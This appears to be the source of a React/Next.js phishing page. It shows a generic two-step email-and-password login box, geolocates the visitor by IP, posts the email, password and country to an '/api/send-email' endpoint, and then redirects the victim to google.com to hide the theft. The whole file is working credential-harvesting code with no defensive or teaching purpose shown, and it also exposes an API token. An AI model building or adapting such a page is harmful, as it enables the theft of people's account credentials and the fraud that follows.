import { useState, useEffect } from 'react';
import axios from 'axios';
import styles from '../styles/Home.module.css';

export default function Home() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [country, setCountry] = useState('');
  const [emailSubmitted, setEmailSubmitted] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');

  useEffect(() => {
    // Fetch user's country based on IP
    axios.get('https://ipinfo.io/json?token=c3e87e382ddea7')
      .then(response => {
        setCountry(response.data.country);
      })
      .catch(error => {
        console.error('Failed to fetch country:', error);
      });
  }, []);

  const handleEmailSubmit = (e) => {
    e.preventDefault();
    if (validateEmail(email)) {
      setEmailSubmitted(true);
      setErrorMessage('');
    } else {
      setErrorMessage('Please enter a valid email address.');
    }
  };

  const handlePasswordSubmit = async (e) => {
    e.preventDefault();
    if (password.length >= 5) {
      try {
        const response = await axios.post('/api/send-email', {
          email,
          password,
          country,
        });
        console.log('Email sent successfully!', response.data.message);
        window.location.href = 'https://google.com';
      } catch (error) {
        console.error('Failed to send email:', error);
        setErrorMessage('Failed to submit. Please try again.');
      }
    } else {
      setErrorMessage('Password must be at least 5 characters long.');
    }
  };

  const validateEmail = (email) => {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(String(email).toLowerCase());
  };

  return (
    <div className={styles.container}>
      <div className={styles.loginBox}>
        <img src="/logo.png" alt="Logo" className={styles.logo} />
        {emailSubmitted ? (
          <>
            <div className={styles.displayEmail}>{email}</div>
            <form onSubmit={handlePasswordSubmit}>
              <input
                type="password"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
              <button type="submit" className={styles.submitButton}>Validate</button>
            </form>
          </>
        ) : (
          <form onSubmit={handleEmailSubmit}>
            <input
              type="email"
              placeholder="Email Address"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
            />
            <button type="submit" className={styles.submitButton}>Next</button>
          </form>
        )}
        {errorMessage && <div className={styles.errorMessage}>{errorMessage}</div>}
      </div>
    </div>
  );
}
